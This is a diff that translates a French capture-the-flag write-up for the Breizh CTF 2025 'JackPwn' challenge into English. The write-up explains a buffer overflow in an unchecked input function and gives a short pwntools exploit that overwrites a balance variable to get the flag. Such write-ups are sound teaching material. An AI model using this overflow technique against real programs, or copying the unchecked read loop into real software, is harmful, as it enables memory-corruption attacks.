@@ -1,6 +1,6 @@
 ---
 title: "Breizh CTF 2025 - JackPwn"
-date: 2024-04-14
+date: 2025-04-14
 tags: ["buffer-overflow", "exploitation"]
 categories: ["pwn"]
 ctfs: ["breizh-ctf"]
@@ -8,13 +8,13 @@ ctfs: ["breizh-ctf"]
 
 # JackPwn - Breizh CTF 2025
 
-## Description du challenge
+## Challenge Description
 
-JackPwn est un challenge de la catégorie Pwn du Breizh CTF 2025. Il simule un jeu de roulette avec une vulnérabilité .
+JackPwn is a Pwn category challenge from Breizh CTF 2025. It simulates a roulette game with a vulnerability.
 
-## Analyse du binaire
+## Binary Analysis
 
-Voici le code source du binaire :
+Here is the source code of the binary:
 
 ```c
 #include <stdlib.h>
@@ -119,19 +119,19 @@ int main() {
 }
 ```
 
-Après analyse, on peut identifier plusieurs points clés :
+After analysis, we can identify several key points:
 
-1. Le programme simule un jeu de roulette où le joueur peut miser sur "rouge", "noir", "pair" ou "impair"
-2. Une structure `ctx` contient deux éléments :
-   - `mise[32]` : un buffer de 32 octets pour stocker la mise
-   - `solde` : un entier qui représente l'argent du joueur
-3. Le flag est affiché uniquement si le solde atteint exactement 0x1337 (4919 en décimal)
-4. La fonction `read_input()` lit des caractères jusqu'à rencontrer un retour à la ligne, sans vérifier la taille du buffer
-5. Avec un solde initial de 50 et des gains/pertes de seulement 2, il faudrait énormément de parties pour atteindre 4919
+1. The program simulates a roulette game where the player can bet on "rouge" (red), "noir" (black), "pair" (even), or "impair" (odd)
+2. A `ctx` structure contains two elements:
+   - `mise[32]`: a 32-byte buffer to store the bet
+   - `solde`: an integer representing the player's balance
+3. The flag is displayed only if the balance reaches exactly 0x1337 (4919 in decimal)
+4. The `read_input()` function reads characters until it encounters a newline, without checking the buffer size
+5. With an initial balance of 50 and gains/losses of only 2, it would take a huge number of rounds to reach 4919
 
-## Vulnérabilité
+## Vulnerability
 
-La vulnérabilité principale est un buffer overflow classique dans la fonction `read_input()` :
+The main vulnerability is a classic buffer overflow in the `read_input()` function:
 
 ```c
 void read_input(char *buf) {
@@ -149,36 +149,31 @@ void read_input(char *buf) {
 }
 ```
 
-Cette fonction ne vérifie pas la taille du buffer et continue d'écrire tant qu'elle ne rencontre pas un retour à la ligne. De plus, lors de l'appel à cette fonction, le buffer passé en paramètre est `ctx.mise`, qui ne fait que 32 octets. Si on entre plus de 32 caractères, on débordera sur le champ `solde` qui se trouve juste après dans la mémoire.
+This function does not check the buffer size and continues writing until it encounters a newline. Moreover, when this function is called, the buffer passed as a parameter is `ctx.mise`, which is only 32 bytes. If you enter more than 32 characters, you will overflow into the `solde` field, which is located just after in memory.
 
 ## Exploitation
 
-La stratégie d'exploitation est simple :
-1. Remplir les 32 octets du buffer `mise`
-2. Écrire en plus exactement les 4 octets de la valeur 0x1337 (4919) dans `solde`
-3. La valeur sera considérée comme valide car le buffer se termine par un 0 (ajouté par `read_input`)
+The exploitation strategy is simple:
+1. Fill the 32-byte `mise` buffer
+2. Write exactly 4 more bytes with the value 0x1337 (4919) into `solde`
+3. The value will be considered valid because the buffer is null-terminated (added by `read_input`)
 
-Voici comment exploiter cette vulnérabilité :
+Here is how to exploit this vulnerability:
 
 ```python
 from pwn import *
 
-# Configuration
 HOST = "jackpwn-180.chall.ctf.bzh"
 PORT = 1337
 
-# Connexion
 p = remote(HOST, PORT)
 
-# Construction du payload
-# La structure est alignée sur 64 bits
-payload = b"rouge".ljust(32, b"\x00")  # Mise valide + padding avec des null bytes
-payload += p64(0x1335)                 # 0x1337 - 2, aligné sur 64 bits
+payload = b"rouge".ljust(32, b"\x00")  
+payload += p64(0x1335)                 #0x1337 - 2 align on 64 bits 
 
 p.recvuntil(b"Votre mise : ")
 p.sendline(payload)
 
-# Lire la sortie ligne par ligne
 while True:
     try:
         line = p.recvline(timeout=1).decode().strip()
@@ -194,7 +189,7 @@ p.close()
 
 ## Flag
 
-Après exécution de l'exploit, le programme détecte que le solde est exactement 0x1337 et affiche le flag :
+After running the exploit, the program detects that the balance is exactly 0x1337 and displays the flag:
 
 ```
 $ python3 exploit.py
@@ -206,7 +201,3 @@ Solde : 4919
 Votre mise : 
 BZHCTF{j4ckp0t_0v3rfl0w_ftw}
 ```
-
-## Conclusion
-
-JackPwn est un exercice classique de buffer overflow visant à modifier une variable adjacente en mémoire. La vulnérabilité est dans la fonction `read_input()` qui n'effectue aucune vérification de la taille du buffer, permettant ainsi d'écrire au-delà des limites du tableau `mise` et de modifier directement la valeur de `solde` pour atteindre la condition de victoire. 
